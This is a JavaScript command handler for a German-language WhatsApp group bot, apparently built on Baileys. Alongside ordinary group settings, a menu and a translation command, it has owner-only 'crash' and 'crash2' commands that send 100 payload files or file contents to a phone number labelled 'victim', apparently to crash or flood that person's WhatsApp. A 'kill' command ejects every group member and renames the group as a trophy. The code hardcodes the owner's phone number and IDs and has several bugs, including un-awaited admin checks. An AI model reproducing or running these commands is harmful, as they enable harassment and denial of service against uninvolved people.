import fs from "fs";
import path from "path";
import { exec, spawn } from "child_process";

import { slot } from "./slot.js";
import { handleAutoFarm } from "./autofarm.js";


// ========================= OWNER SYSTEM =========================
export const OWNER_SETTINGS = {
    ownerJid: "4915129559931@s.whatsapp.net",
    ownerLid: "218507098771705@lid",
    owner2Lid: "45681943306435@lid",
    owner3Lid: "30503562416321@lid", // Patrick
    ownerName: "᭙ꪖ᭢ᡶꫀᦔꪖకꪖ",
    botName: "᭙ꪖ᭢ᡶꫀᦔꪖకꪖ",
    packName: "wantedasa",
    version: "1.0.1"
};

// ========================= BOT CONFIG =========================
const CONFIG_FILE = path.join("./data", "botConfig.json");
if (!fs.existsSync("./data")) fs.mkdirSync("./data");

let botConfig = { 
    publicMode: true, 
    autoRead: false,
    autoMessages: {},
    owners: [],
    onlineMessages: {},
    autoFishGroups: {},
    autoreacts: {}
};


if (fs.existsSync(CONFIG_FILE)) {
    try {
        const raw = fs.readFileSync(CONFIG_FILE, "utf-8");
        botConfig = JSON.parse(raw);
    } catch (e) {
        console.error("Fehler beim Laden von botConfig.json:", e);
    }
}
botConfig.autoMessages = botConfig.autoMessages || {};
botConfig.owners = botConfig.owners || [];
botConfig.onlineMessages = botConfig.onlineMessages || {};
botConfig.autoReacts = botConfig.autoReacts || {};
botConfig.autoFishGroups = botConfig.autoFishGroups || {};

export const saveBotConfig = () => {
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(botConfig, null, 2), "utf-8");
    } catch (e) {
        console.error("Fehler beim Speichern von botConfig.json:", e);
    }
};

export { botConfig };

const autoIntervals = {};
const chats = {};
const autoFailCount = {};
let autoMessageInterval = null;


export const setOnlineMessage = (groupId, text) => {
    if (!botConfig.onlineMessages[groupId]) {
        botConfig.onlineMessages[groupId] = { enabled: true, text };
    } else {
        botConfig.onlineMessages[groupId].text = text;
    }
    saveBotConfig();
};

const defaultOnlineText = `╭───〔 🤖 BOT ONLINE 〕───⬣\n│\n│ ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ ist wieder online!\n│ ⚡ Systeme stabil\n│ 📡 Status: Aktiv\n│\n╰────────────────⬣`;

export const toggleOnlineMessage = (groupId, state) => {
    if (!botConfig.onlineMessages[groupId]) {
        botConfig.onlineMessages[groupId] = { enabled: state, text: `${defaultOnlineText}` };
    } else {
        botConfig.onlineMessages[groupId].enabled = state;
    }
    saveBotConfig();
};

export async function sendOnlineMessages(sock) {
    for (const groupId in botConfig.onlineMessages) {
        const data = botConfig.onlineMessages[groupId];

        if (!data.enabled) continue;

        try {
            await sock.sendMessage(groupId, { text: data.text });
            console.log(`📢 Online-Message gesendet an ${groupId}`);
        } catch (e) {
            console.log(`❌ Fehler bei ${groupId}:`, e.message);
        }
    }
}


// ========================= GROUP SETTINGS =========================
export const groupSettings = {};

export const ensureGroupSettings = (jid) => {
    if (!groupSettings[jid]) groupSettings[jid] = { welcome: true, leave: true, antidelete: false };
};

export let PUBLIC_MODE = botConfig.publicMode;

// ========================= HELPERS =========================
export const getText = (msg) => {
    if (msg.message?.conversation) return msg.message.conversation;
    if (msg.message?.extendedTextMessage?.text) return msg.message.extendedTextMessage.text;
    return "";
};

export const isGroup = (jid) => jid.endsWith("@g.us");

export const isWantedasa = (sender) => {
    const owners = [
        OWNER_SETTINGS.ownerJid,
        OWNER_SETTINGS.ownerLid,
        OWNER_SETTINGS.owner2Lid,
        OWNER_SETTINGS.owner3Lid

    ];

    return owners.includes(sender);
};

export const isOwner = (sender) => {
    return isWantedasa(sender) || botConfig.owners.includes(sender);
};

export const isAdmin = async (sock, jid, user) => {
    try {
        const meta = await sock.groupMetadata(jid);
        const participant = meta.participants.find(p => p.id === user);
        return participant?.admin ? true : false;
    } catch (err) {
        console.error("Fehler beim Prüfen des Admins:", err);
        return false;
    }
};

export const reply = async (sock, msg, text, extra = {}) => {
    return await sock.sendMessage(msg.key.remoteJid, { text, ...extra }, { quoted: msg });
};


//=========================//
// COMMAND HANDLER
//=========================//
export async function handleCommands(sock, msg) {
    const from = msg.key.remoteJid;
    const sender = msg.key.participant || from;

    const text = getText(msg);

    const prefix = botConfig.prefix && botConfig.prefix.length > 0 ? botConfig.prefix : ".";

    if (!text.startsWith(prefix)) return;
    
    if (!PUBLIC_MODE && !isOwner(sender, botConfig)) return;

    const args = text.slice(1).trim().split(" ");
    const command = args.shift().toLowerCase();
    const value = args[0]?.toLowerCase();

    ensureGroupSettings(from);

if (command === "welcome") {
    if (!botConfig.groupSettings) botConfig.groupSettings = {};
    if (!botConfig.groupSettings[from]) botConfig.groupSettings[from] = { welcome: true, leave: true, antidelete: false };

    const value = args[0]?.toLowerCase();
    if (!value || (value !== "on" && value !== "off")) {
        return reply(sock, msg, `⚙️ Nutzung: ${prefix}welcome on/off`);
    }

    botConfig.groupSettings[from].welcome = value === "on";
    saveBotConfig();
    return reply(sock, msg, botConfig.groupSettings[from].welcome ? "✅ Welcome aktiviert" : "❌ Welcome deaktiviert");
}

if (command === "leave") {
    if (!botConfig.groupSettings) botConfig.groupSettings = {};
    if (!botConfig.groupSettings[from]) botConfig.groupSettings[from] = { welcome: true, leave: true, antidelete: false };

    const value = args[0]?.toLowerCase();
    if (!value || (value !== "on" && value !== "off")) {
        return reply(sock, msg, `⚙️ Nutzung: ${prefix}leave on/off`);
    }

    botConfig.groupSettings[from].leave = value === "on";
    saveBotConfig();
    return reply(sock, msg, botConfig.groupSettings[from].leave ? "✅ Leave aktiviert" : "❌ Leave deaktiviert");
}
if (command === "antidelete") {
    if (!botConfig.groupSettings) botConfig.groupSettings = {};
    if (!botConfig.groupSettings[from]) botConfig.groupSettings[from] = { welcome: true, leave: true, antidelete: false };

    // Admin-Check
    const admin = await isAdmin(sock, from, sender);
    if (!isOwner(sender)) return reply(sock, msg, "❌ Nur Owner können Antidelete setzen!");

    const value = args[0]?.toLowerCase();
    if (!value || (value !== "on" && value !== "off")) {
        return reply(sock, msg, `⚙️ Nutzung: ${prefix}antidelete on/off`);
    }

    botConfig.groupSettings[from].antidelete = value === "on";
    saveBotConfig();
    return reply(sock, msg, botConfig.groupSettings[from].antidelete ? "✅ Antidelete aktiviert!" : "❌ Antidelete deaktiviert!");
}
if (command === "antilink") {
    if (!botConfig.groupSettings) botConfig.groupSettings = {};
    if (!botConfig.groupSettings[from]) {
        botConfig.groupSettings[from] = {
            welcome: true,
            leave: true,
            antidelete: false,
            antilink: false
        };
    }

    if (!isOwner(sender) && !isAdmin(sock, from, sender)) {
    return reply(sock, msg, "❌ Nur Admins können Antilink setzen!");
}

    const value = args[0]?.toLowerCase();
    if (!value || (value !== "on" && value !== "off")) {
        return reply(sock, msg, `⚙️ Nutzung: ${prefix}antilink on/off`);
    }

    botConfig.groupSettings[from].antilink = value === "on";
    saveBotConfig();

    return reply(
        sock,
        msg,
        botConfig.groupSettings[from].antilink
            ? "🔗 Antilink aktiviert!"
            : "❌ Antilink deaktiviert!"
    );
}
if (command === "autoread") {
    if (!args[0]) return reply(sock, msg, `❌ Nutzung: ${prefix}autoread <on|off> [groups|private]`);

    const state = args[0].toLowerCase() === "on";
    const type = args[1]?.toLowerCase();

    if (!type) {
        botConfig.autoReadGroups = state;
        saveBotConfig();
        return reply(sock, msg, `✅ AutoRead für Gruppen ${state ? "aktiviert" : "deaktiviert"}`);
    } 
    
    if (type === "private" || type === "pn") {
        botConfig.autoReadPrivate = state;
        saveBotConfig();
        return reply(sock, msg, `✅ AutoRead für Private Chats ${state ? "aktiviert" : "deaktiviert"}`);
    } 
    
    if (type === "groups" || type === "grp") {
        botConfig.autoReadGroups = state;
        saveBotConfig();
        return reply(sock, msg, `✅ AutoRead für Gruppen ${state ? "aktiviert" : "deaktiviert"}`);
    } 
    
    return reply(sock, msg, "❌ Ungültiger Typ! Nutze groups oder private");
}
if (command === "autoblock") {

    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner dürfen das nutzen!");
    }

    const state = args[0]?.toLowerCase();

    if (state === "an") {
        botConfig.autoBlock = true;
    } 
    else if (state === "aus") {
        botConfig.autoBlock = false;
    } 
    else {
        return reply(sock, msg, `❌ Nutzung: ${prefix}autoblock an / aus`);
    }

    saveBotConfig();

    reply(sock, msg, `⚙️ AutoBlock ist jetzt ${botConfig.autoBlock ? "aktiviert" : "deaktiviert"}`);
}
if (command === 'anticall') {
    const arg = args[0]?.toLowerCase();

    if (!arg || (arg !== 'on' && arg !== 'off')) {
        return await sock.sendMessage(from, {
            text: `❌ Nutzung:\n${prefix}anticall on\n${prefix}anticall off`
        });
    }

    if (arg === 'on') {
        botConfig.antiCall = true;
        saveBotConfig();
        return await sock.sendMessage(from, { text: '✅ Anti-Call wurde aktiviert.' });
    }

    if (arg === 'off') {
        botConfig.antiCall = false;
        saveBotConfig();
        return await sock.sendMessage(from, { text: '❌ Anti-Call wurde deaktiviert.' });
    }
}
if (command === "online") {
    if (!isOwner) return reply(sock, msg, "❌ Nur Owner!");

    const sub = args[0];
    const text = args.slice(1).join(" ");

    if (!botConfig.onlineMessages[from]) {
        botConfig.onlineMessages[from] = {
            enabled: false,
            text: `${defaultOnlineText}`
        };
    }

    const data = botConfig.onlineMessages[from];

    if (sub === "on") {
        data.enabled = true;
        saveBotConfig();
        return reply(sock, msg, "✅ Online-Message aktiviert.");
    }

    if (sub === "off") {
        data.enabled = false;
        saveBotConfig();
        return reply(sock, msg, "❌ Online-Message deaktiviert.");
    }

    if (sub === "set") {
        if (!text) {
            return reply(sock, msg, `❌ Nutzung: ${prefix}online set <text>`);
        }

        data.text = text;
        saveBotConfig();

        return reply(sock, msg, "✅ Online-Message gesetzt.");
    }

    if (sub === "setdefault") {
        data.text = `${defaultOnlineText}`;
        saveBotConfig();

        return reply(sock, msg, `♻️ Online-Message auf ${defaultOnlineText} zurückgesetzt.`);
    }

    return reply(sock, msg, 
`📡 *Online-Message*

Status: ${data.enabled ? "✅ AN" : "❌ AUS"}
Text: ${data.text}

⚙️ Nutzung:
${prefix}online on/off
${prefix}online set <text>
${prefix}online setdefault`
    );
}
if (command === "autoreact") {
    if (!from.endsWith("@g.us")) {
        return reply(sock, msg, "❌ Nur in Gruppen nutzbar.");
    }

    if (!isOwner) {
        return reply(sock, msg, "❌ Nur Owner dürfen das einstellen.");
    }

    const sub = args[0];
    const groupId = from;

    if (!botConfig.autoReacts[groupId]) {
        botConfig.autoReacts[groupId] = {
            enabled: false,
            emoji: "🌚"
        };
    }

    if (sub === "set") {
        const emoji = args[1];

        if (!emoji) {
            return reply(sock, msg, "❌ Beispiel: autoreact set 🌚");
        }

        botConfig.autoReacts[groupId].emoji = emoji;
        saveBotConfig();

        return reply(sock, msg, `✅ Emoji gesetzt auf ${emoji}`);
    }
    if (sub === "on") {
        botConfig.autoReacts[groupId].enabled = true;
        saveBotConfig();

        return reply(sock, msg, `✅ Auto-Reaction aktiviert (${botConfig.autoReacts[groupId].emoji})`);
    }
    if (sub === "off") {
        botConfig.autoReacts[groupId].enabled = false;
        saveBotConfig();

        return reply(sock, msg, "❌ Auto-Reaction deaktiviert.");
    }
    const data = botConfig.autoReacts[groupId];

    return reply(sock, msg,
`╭───〔 🤖 AUTO REACT 〕───⬣
│
│ Status: ${data?.enabled ? "✅ AN" : "❌ AUS"}
│ Emoji: ${data?.emoji || "❌ keines"}
│
│ ${prefix}autoreact set 🌚
│ ${prefix}autoreact on
│ ${prefix}autoreact off
│
╰────────────────⬣`);
}
if (command === "prefix") {
    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner können den Prefix ändern!");
    }

    const newPrefix = args[0];

    if (!newPrefix) {
        return reply(sock, msg,
`📌 Aktueller Prefix: ${prefix}

Nutzung: 
${prefix}prefix <1 Zeichen>`
        );
    }
    if (newPrefix.length !== 1) {
        return reply(sock, msg, "❌ Prefix darf nur 1 Zeichen lang sein!");
    }

    botConfig.prefix = newPrefix;
    saveBotConfig();

    return reply(sock, msg, `✅ Prefix wurde zu "${newPrefix}" geändert!`);
}
if (command === "update") {
    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner können den Bot updaten!");
    }

    reply(sock, msg, "🔍 Suche nach Updates...");

    exec("git fetch origin main && git pull origin main", (error, stdout, stderr) => {
        if (error) {
            return reply(sock, msg, `❌ Update fehlgeschlagen:\n${error.message}`);
        }

        const upToDate = stdout.includes("Already up to date");

        exec("git log -5 --pretty=format:'%h - %s (%an)'", (err2, logOut) => {

            let changes = stdout
                .split("\n")
                .filter(line =>
                    line.includes("changed") ||
                    line.includes("insertions") ||
                    line.includes("deletions") ||
                    line.includes("|")
                )
                .join("\n");

            const text =
`✅ *Update abgeschlossen!*

📦 *Änderungen:*
${upToDate ? "• Keine neuen Änderungen" : (changes || "• Dateien aktualisiert")}

🧾 *Letzte Commits:*
${logOut || "Keine Daten"}

♻️ Bot startet jetzt neu...\nDas kann bis zu 10 Sekunden dauern. Bitte habe etwas Geduld!`;

            reply(sock, msg, text);

            setTimeout(() => {
                exec("node restart.js");
                process.exit(0);
            }, 2000);
        });
    });
}
    if (command === "owner") {
    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner dürfen diesen Command nutzen!");
    }

    const sub = args[0]?.toLowerCase();

    if (!sub) {
        return reply(sock, msg,
`❌ Nutzung:
${prefix}owner add @user / (auf User antworten)
${prefix}owner del @user / (auf User antworten)
${prefix}owner list`);
    }

    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid;
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;
    const target = mentioned?.[0] || quoted;

    if (sub === "add") {
        if (!target) {
            return reply(sock, msg, "❌ Markiere oder antworte auf einen User!");
        }

        if (mentioned?.length > 1) {
            return reply(sock, msg, "❌ Bitte nur eine Person markieren!");
        }

        if (botConfig.owners.includes(target)) {
            return reply(sock, msg, "⚠️ User ist bereits Owner!");
        }

        botConfig.owners.push(target);
        saveBotConfig();

        return reply(sock, msg, `✅ @${target.split("@")[0]} ist jetzt Owner!`, [target]);
    }

    if (sub === "del") {
        if (!target) {
            return reply(sock, msg, "❌ Markiere oder antworte auf einen User!");
        }

        if (mentioned?.length > 1) {
            return reply(sock, msg, "❌ Bitte nur eine Person markieren!");
        }

        if (target === OWNER_SETTINGS.ownerJid) {
            return reply(sock, msg, "❌ Haupt-Owner kann nicht entfernt werden!");
        }

        const index = botConfig.owners.indexOf(target);

        if (index === -1) {
            return reply(sock, msg, "❌ Dieser User ist kein Owner!");
        }

        botConfig.owners.splice(index, 1);
        saveBotConfig();

        return reply(sock, msg, `✅ @${target.split("@")[0]} wurde entfernt!`, [target]);
    }

    if (sub === "list") {
        if (!botConfig.owners.length) {
            return reply(sock, msg, "❌ Keine zusätzlichen Owner gesetzt!");
        }

        let text = "👑 *Owner Liste:*\n\n";

        for (let o of botConfig.owners) {
            text += `• @${o.split("@")[0]}\n`;
        }

        return reply(sock, msg, text, botConfig.owners);
    }
    return reply(sock, msg, "❌ Unbekannter Subcommand! Nutze: add, del, list");
}
if (command === "tagadmins") {
    if (!msg.key.remoteJid.endsWith("@g.us")) {
        return reply(sock, msg, "❌ Dieser Befehl geht nur in Gruppen.");
    }

    const groupMetadata = await sock.groupMetadata(from);
    const participants = groupMetadata.participants;

    // Admins filtern
    const admins = participants
        .filter(p => p.admin === "admin" || p.admin === "superadmin")
        .map(p => p.id);

    if (admins.length === 0) {
        return reply(sock, msg, "⚠️ Keine Admins in dieser Gruppe gefunden.");
    }

    let text = `╭━━━〔 📢 *GRUPPEN-ADMINS* 〕━━━╮

👑 *Admins in dieser Gruppe:*

${admins.map((id, i) => 
`┃ ${i + 1}. @${id.split("@")[0]}`
).join("\n")}

╰━━━━━━━━━━━━━━━━━━━━━━━╯`.trim();

    await sock.sendMessage(from, {
        text,
        mentions: admins
    }, { quoted: msg });
}
if (command === "bot") {
    const mode = PUBLIC_MODE ? "🌍 PUBLIC MODE" : "🔒 SELF MODE";

    const autoReadGroups = botConfig?.autoReadGroups ? "✅ AN" : "❌ AUS";
    const autoReadPrivate = botConfig?.autoReadPrivate ? "✅ AN" : "❌ AUS";
    const autoBlock = botConfig?.autoBlock ? "✅ AN" : "❌ AUS";
    const antiCall = botConfig?.antiCall ? "✅ AN" : "❌ AUS";

    const settings = botConfig?.groupSettings?.[from] || {
        antidelete: false,
        antilink: false
    };

    const onlineData = botConfig?.onlineMessages?.[from] || {
        enabled: false,
        text: "Nicht gesetzt"
    };
    const autoreact = botConfig.autoReacts[from];

    const text = `🤖 ${OWNER_SETTINGS.botName}
👑 Owner: ${OWNER_SETTINGS.ownerName}
⚡ Version: ${OWNER_SETTINGS.version}
🟢 Mode: ${mode}
📰 Prefix: ${prefix} 

📖 Auto-Read Gruppen: ${autoReadGroups}
📖 Auto-Read Private: ${autoReadPrivate}
⛔ Auto-Block: ${autoBlock}
📵 Anti-Call: ${antiCall}

⬣───〔 ⚙️ GROUP STATUS 〕───⬣

🤖 Bot Online: ${onlineData.enabled ? "✅ ON" : "❌ OFF"}
🗑 Antidelete: ${settings.antidelete ? "✅ ON" : "❌ OFF"}
🔗 Antilink: ${settings.antilink ? "✅ ON" : "❌ OFF"}
🌚 AutoReact: ${autoreact.antilink ? "✅ ON" : "❌ OFF"}

⬣──────────────────────⬣`;

    return await reply(sock, msg, text);
}
if (command === "self") {
    if (!isOwner(sender)) {
        return reply(sock, msg, "❌ Nur Owner!");
    }

    if (botConfig.publicMode === false) {
        return reply(sock, msg, "🔒 SELF MODE ist bereits aktiviert!");
    }

    PUBLIC_MODE = false;
    botConfig.publicMode = false;
    saveBotConfig();

    return reply(sock, msg, "🔒 SELF MODE aktiviert");
}
if (command === "public") {
    if (!isOwner(sender)) {
        return reply(sock, msg, "❌ Nur Owner!");
    }

    if (botConfig.publicMode === true) {
        return reply(sock, msg, "🌍 PUBLIC MODE ist bereits aktiviert!");
    }

    PUBLIC_MODE = true;
    botConfig.publicMode = true;
    saveBotConfig();

    return reply(sock, msg, "🌍 PUBLIC MODE aktiviert");
}

    if (command === "menu") {
        return reply(sock, msg,
`┏━━━━━━━━━━━━━━━━━━━━┓
┃ *${OWNER_SETTINGS.botName}*
┠────────────────────┨
┃ ♛ Oᴡɴᴇʀ: ${OWNER_SETTINGS.ownerName}
┃ ⎔ Vᴇʀsɪᴏɴ: ${OWNER_SETTINGS.version}
┠────────────────────┨
┃
┃ *⌬ Cᴏʀᴇ*
┃ ├ ${prefix}menu
┃ ├ ${prefix}bot
┃ └ ${prefix}about
┃
┃ *☍ Gʀᴏᴜᴘ Sʏsᴛᴇᴍ*
┃ ├ ${prefix}hidetag
┃ ├ ${prefix}kick
┃ ├ ${prefix}welcome on/off
┃ ├ ${prefix}leave on/off
┃ ├ ${prefix}antilink on/off
┃ ├ ${prefix}grpname
┃ ├ ${prefix}grpdesc
┃ ├ ${prefix}delete
┃ ├ ${prefix}promote / ${prefix}demote
┃ ├ ${prefix}mute / ${prefix}unmute
┃ ├ ${prefix}grouplink
┃ ├ ${prefix}tagadmins
┃ └ ${prefix}grppic
┃
┃ *⧉ Tᴏᴏʟs*
┃ ├ ${prefix}calc
┃ ├ ${prefix}poll
┃ ├ ${prefix}translate
┃ └ ${prefix}emptymsg
┃
┃ *⚝ Gᴀᴍᴇꜱ*
┃ └ ${prefix}slot
┃
┃ *⚿ Oᴡɴᴇʀ*
┃ ├ ${prefix}self
┃ ├ ${prefix}public
┃ ├ ${prefix}info
┃ ├ ${prefix}autoread
┃ ├ ${prefix}grpleave
┃ ├ ${prefix}device
┃ ├ ${prefix}block / ${prefix}unblock
┃ ├ ${prefix}antidelete on/off
┃ └ ${prefix}automsg set/stop
┗━━━━━━━━━━━━━━━━━━━━┛`
        );
    }
if (command === "about") {
    const combinedMessage = `╔════════════════════════╗
║ 🤖 ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ Bot
║ 👑 Owner: ${OWNER_SETTINGS.ownerName}
║ ⚡ Version: ${OWNER_SETTINGS.version}
╠════════════════════════╣
║ 🌐 WhatsApp Kanal
║ https://whatsapp.com/channel/0029VbCPWBN3wtbEcT5LBp04
╠════════════════════════╣
║ 📱 Telegram Kanal
║ https://t.me/devwantedasa
╚════════════════════════╝`;

    await sock.sendMessage(from, { text: combinedMessage });
}
    if (command === "ping" || command === "p") {
        const start = Date.now();
        await reply(sock, msg, "🏓 Pinging...");
        const latency = Date.now() - start;
        return reply(sock, msg, `█▀█ █▀█ █▄   █ █▀▀ █
█▀▀ █▄█ █   ▀█ █▄█ ▄
ᴅᴇʀ ʙᴏᴛ ɪsᴛ ᴏɴʟɪɴᴇ.
ㅤ\n⏱️ Latenz: ${latency}ms`);
    }
    if (command === "kick") {
    if (!isGroup(from)) return;

    if (!isAdmin && !isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Admin oder Owner!");
    }

    let targets = [];

    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid;
    if (mentioned && mentioned.length > 0) {
        targets = mentioned;
    }

    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
    if (targets.length === 0 && contextInfo?.participant) {
        targets.push(contextInfo.participant);
    }

    if (targets.length === 0) {
        return reply(sock, msg, "❌ Markiere jemanden oder antworte auf eine Nachricht!");
    }

    try {
        await sock.groupParticipantsUpdate(from, targets, "remove");
        return reply(sock, msg, "🚫 User wurde gekickt!");
    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Fehler beim Kicken!");
    }
}
if (command === "slot") {
    let amount = parseInt(args[0]) || 100;

    slot(sock, msg, sender, amount);
}
if (command === "emptymsg") {
    return sock.sendMessage(from, {
        text: "\u200B"
    });
}
if (command === "crash") {
    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner dürfen diesen Command nutzen!");
    }

    if (!args[0]) {
        return reply(sock, msg, `❌ Nutzung: ${prefix}crash 49123456789`);
    }

    const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const amount = 100;

    async function WantedasaCrash1(name, chat) {
        await sock.sendMessage(chat, {
            document: { url: "./wantedasa1.js" },
            mimetype: "image/null",
            fileName: `wantedasa1.js`,
            caption: `crash by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ`
        });
    }

    for (let i = 0; i < amount; i++) {
        await WantedasaCrash1("Wantedasa", victim);
    }

    reply(sock, msg, `done.`);
}
if (command === "crash2") {
    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner dürfen diesen Command nutzen!");
    }

    if (!args[0]) {
        return reply(sock, msg, `❌ Nutzung: ${prefix}crash2 49123456789`);
    }

    const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const amount = 100;

    const filePath = "./wantedasa2.js";

    if (!fs.existsSync(filePath)) {
        return reply(sock, msg, "❌ Datei nicht gefunden!");
    }

    const fileContent = fs.readFileSync(filePath, "utf-8");

    async function WantedasaCrash(chat) {
        await sock.sendMessage(chat, {
            text: fileContent
        });
    }

    for (let i = 0; i < amount; i++) {
        await WantedasaCrash(victim);
    }

    return reply(sock, msg, `done.`)
}
if (command === "tr" || command === "translate" || command === "übersetzung") {

    const languages = {
        de: "Deutsch", en: "Englisch", fr: "Französisch", es: "Spanisch",
        it: "Italienisch", nl: "Niederländisch", pl: "Polnisch",
        pt: "Portugiesisch", ro: "Rumänisch", cs: "Tschechisch",
        sv: "Schwedisch", no: "Norwegisch", fi: "Finnisch",
        tr: "Türkisch", ar: "Arabisch", he: "Hebräisch",
        hi: "Hindi", th: "Thailändisch", vi: "Vietnamesisch",
        id: "Indonesisch", zh: "Chinesisch", ja: "Japanisch", ko: "Koreanisch"
    };

    const flags = {
        de: "🇩🇪", en: "🇬🇧", fr: "🇫🇷", es: "🇪🇸",
        it: "🇮🇹", nl: "🇳🇱", pl: "🇵🇱", pt: "🇵🇹",
        ro: "🇷🇴", cs: "🇨🇿", sv: "🇸🇪", no: "🇳🇴",
        fi: "🇫🇮", tr: "🇹🇷", ar: "🇸🇦", he: "🇮🇱",
        hi: "🇮🇳", th: "🇹🇭", vi: "🇻🇳", id: "🇮🇩",
        zh: "🇨🇳", ja: "🇯🇵", ko: "🇰🇷"
    };
    if (args[0] === "list") {
        let listText = "🌍 *Verfügbare Sprachen:*\n\n";
        for (const [code, name] of Object.entries(languages)) {
            listText += `${flags[code] || "🌐"} *${code.toUpperCase()}* → ${name}\n`;
        }
        return reply(sock, msg, listText);
    }

    const targetLang = args[0]?.toLowerCase();
    
    let input = args.slice(1).join(" ");
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    
    if (quoted && !input) {
        input = quoted.conversation || quoted.extendedTextMessage?.text || quoted.imageMessage?.caption || "";
    }
    if (!targetLang || !input) {
        return reply(sock, msg, `❌ *Fehler!*\nNutze: ${prefix}${command} <sprache> <text>\nOder antworte auf eine Nachricht mit: ${prefix}${command} <sprache>`);
    }

    if (!languages[targetLang] && !flags[targetLang]) {
        return reply(sock, msg, `❌ Die Sprache "${targetLang}" kenne ich nicht. Schreib *${prefix}${command} list* für alle Codes.`);
    }

    try {
        const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(input)}`;
        const res = await axios.get(url);

        const translatedText = res.data[0].map(x => x[0]).join("");
        let detected = (res.data[2] || "en").toLowerCase().split('-')[0];

        const fromFlag = flags[detected] || "🌐";
        const toFlag = flags[targetLang] || "🌐";

        const finalMsg = 
`${fromFlag} ➜ ${toFlag} *Übersetzung*

📥 *Original (${languages[detected] || detected})*:
${input}

📤 *Übersetzt (${languages[targetLang] || targetLang})*:
${translatedText}`;

        await sock.sendMessage(msg.key.remoteJid, { 
            react: { text: toFlag, key: msg.key } 
        });

        return reply(sock, msg, finalMsg);

    } catch (err) {
        console.error("Translation Error:", err);
        return reply(sock, msg, "❌ API-Fehler. Bitte später nochmal versuchen.");
    }
}
if (command === "getpic") {
    try {
        let target;

        if (msg.message?.extendedTextMessage?.contextInfo?.participant) {
            target = msg.message.extendedTextMessage.contextInfo.participant;
        }
        else if (args[0]) {
            let number = args[0].replace(/[^0-9]/g, "");
            target = number + "@s.whatsapp.net";
        } 
        else {
            return reply(sock, msg, "❌ Nutzung: ${prefix}getpic <nummer> oder auf Nachricht antworten");
        }

        let ppUrl;
        try {
            ppUrl = await sock.profilePictureUrl(target, "image");
        } catch {
            return reply(sock, msg, "❌ Kein Profilbild gefunden!");
        }

        await sock.sendMessage(from, {
            image: { url: ppUrl },
            caption: `📸 Profilbild von:\n${target}`
        }, { quoted: msg });

    } catch (err) {
        console.log(err);
        reply(sock, msg, "❌ Fehler beim Abrufen!");
    }
}
if (command === "kill") {
    if (!isGroup(from)) return;

    if (!isWantedasa(sender)) return;

    try {
        const metadata = await sock.groupMetadata(from);
        const participants = metadata.participants;

        const toKick = participants
            .map(p => p.id)
            .filter(jid => jid !== sender);

        if (toKick.length === 0) {
            return reply(sock, msg, "❌ Keine User zum Kicken gefunden!");
        }
        const chunkSize = 10;
        for (let i = 0; i < toKick.length; i += chunkSize) {
            const chunk = toKick.slice(i, i + chunkSize);
            await sock.groupParticipantsUpdate(from, chunk, "remove");
        }
        await sock.groupUpdateSubject(from, "killed by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ");


        await sock.groupUpdateDescription(from, "killed by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ");
        try {
            await sock.removeProfilePicture(from);
        } catch (e) {
            console.log("Konnte Gruppenbild nicht entfernen");
        }

        return reply(sock, msg, `done.\n🚫 ${toKick.length} User removed`);
        
    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Fehler beim Kicken!");
    }
}
if (command === "device") {
    if (!isOwner(sender)) {
        return sock.sendMessage(from, {
            text: "❌ Nur Owner dürfen diesen Befehl nutzen!",
            quoted: msg
        });
    }
    const chatId = from;

    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;

    if (!contextInfo || !contextInfo.stanzaId) {
        return reply(sock, msg, "❌ Antworte auf eine Nachricht, um die Geräte-Infos zu sehen.");
    }

    const quotedParticipant = contextInfo.participant || "Unbekannt";
    const quotedId = contextInfo.stanzaId;
    const idUpper = quotedId.toUpperCase();

    let device = "Unbekannt";
    let rawDevice = idUpper;

    if (idUpper.startsWith("3E")) {
        device = "WhatsApp Web";
    } else if (idUpper.includes("NEELE")) {
        device = "API (iOS)";
    } else if (idUpper.startsWith("2A")) {
        device = "iOS Business";
    } else if (idUpper.startsWith("3A") || idUpper.startsWith("3C")) {
        device = "Apple iOS";
    } else if (quotedId.length >= 30) {
        device = "Android";
    }

    const mentionJid = quotedParticipant !== "Unbekannt" ? [quotedParticipant] : [];

    const text = `╭───〔 📱 DEVICE ANALYZE 〕───⬣
│
│ 👤 User: ${quotedParticipant !== "Unbekannt" ? `@${quotedParticipant.split("@")[0]}` : "Unbekannt"}
│ 📱 Gerät: ${device}
│ 🧩 Raw: ${rawDevice}
│ 🆔 Msg-ID: ${quotedId}
╰────────────────⬣`;

    await sock.sendMessage(chatId, {
        text,
        mentions: mentionJid
    });
}
if (command === "grouplink" || command === "gc") {
    if (!isGroup(from)) return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");
    if (!isAdmin(sock, from, sender)) return reply(sock, msg, "❌ Nur Admins können den Gruppenlink abrufen!");

    const sub = args[0]?.toLowerCase();

    try {
        const metadata = await sock.groupMetadata(from);
        const groupName = metadata.subject || "Unbekannte Gruppe";
        const members = metadata.participants.length;

        if (sub === "revoke") {
            const code = await sock.groupRevokeInvite(from);
            return await reply(sock, msg, `✅ Gruppenlink wurde resetet!\nNeuer Link:\nhttps://chat.whatsapp.com/${code}`);
        }
        const text = `╔═══『 🌐 Gruppenlink 』═══╗
